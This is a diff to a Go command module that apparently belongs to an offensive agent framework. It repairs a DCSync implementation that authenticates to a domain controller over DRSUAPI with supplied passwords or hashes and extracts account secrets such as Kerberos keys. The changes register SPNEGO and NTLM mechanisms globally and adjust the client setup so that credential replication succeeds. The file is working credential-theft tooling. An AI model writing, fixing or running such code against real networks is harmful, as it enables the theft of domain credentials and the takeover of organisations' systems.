@@ -1,11 +1,13 @@
 package commands
 
 import (
+	"context"
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
 	"net"
 	"strings"
+	"sync"
 	"time"
 
 	"fawkes/pkg/structs"
@@ -18,6 +20,8 @@ import (
 	"github.com/oiweiwei/go-msrpc/msrpc/erref/drsr"
 	"github.com/oiweiwei/go-msrpc/msrpc/samr/samr/v1"
 	"github.com/oiweiwei/go-msrpc/ndr"
+	"github.com/oiweiwei/go-msrpc/ssp"
+	"github.com/oiweiwei/go-msrpc/ssp/gssapi"
 
 	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
 )
@@ -97,14 +101,23 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorResult("Error: no valid target accounts specified")
 	}
 
-	// Set up GSSAPI context
+	// Set up credentials
 	cred, credErr := rpcCredential(args.Username, args.Domain, args.Password, args.Hash)
 	zeroCredentials(&args.Password, &args.Hash)
 	if credErr != nil {
 		return errorf("Error: %v", credErr)
 	}
 
-	ctx, cancel := rpcSecurityContext(cred, time.Duration(args.Timeout)*time.Second)
+	// Register credentials and mechanisms globally — this matches the official
+	// go-msrpc DRSUAPI example pattern where mechanisms must be in the global
+	// store for TCP transport auth to work correctly.
+	dcsyncRegisterMechanisms()
+	gssapi.AddCredential(cred)
+
+	ctx, cancel := context.WithTimeout(
+		gssapi.NewSecurityContext(context.Background()),
+		time.Duration(args.Timeout)*time.Second,
+	)
 	defer cancel()
 
 	// Connect via EPM (Endpoint Mapper, port 135)
@@ -118,10 +131,9 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 	defer cc.Close(ctx)
 
-	// Create DRSUAPI client — WithSeal only; credentials and mechanisms are
-	// carried on ctx (via rpcSecurityContext). Not passing WithCredentials/WithMechanism
-	// here prevents NewSecurity from creating a duplicate SecurityContext.
-	cli, err := drsuapi.NewDrsuapiClient(ctx, cc, dcerpc.WithSeal())
+	// Create DRSUAPI client — matches official example: WithSeal + WithTargetName.
+	// Credentials and mechanisms come from the global store.
+	cli, err := drsuapi.NewDrsuapiClient(ctx, cc, dcerpc.WithSeal(), dcerpc.WithTargetName(args.Server))
 	if err != nil {
 		return errorf("Error creating DRSUAPI client: %v", err)
 	}
@@ -401,8 +413,16 @@ func dcsyncExtractKerberosKeys(prop *samr.UserProperty, result *dcsyncResult) {
 	}
 }
 
+var dcsyncMechOnce sync.Once
+
+func dcsyncRegisterMechanisms() {
+	dcsyncMechOnce.Do(func() {
+		gssapi.AddMechanism(ssp.SPNEGO)
+		gssapi.AddMechanism(ssp.NTLM)
+	})
+}
+
 func dcsyncDecodeUTF16LE(b []byte) string {
-	// Decode UTF-16LE bytes to string, stripping null terminators
 	if len(b)%2 != 0 {
 		b = b[:len(b)-1]
 	}
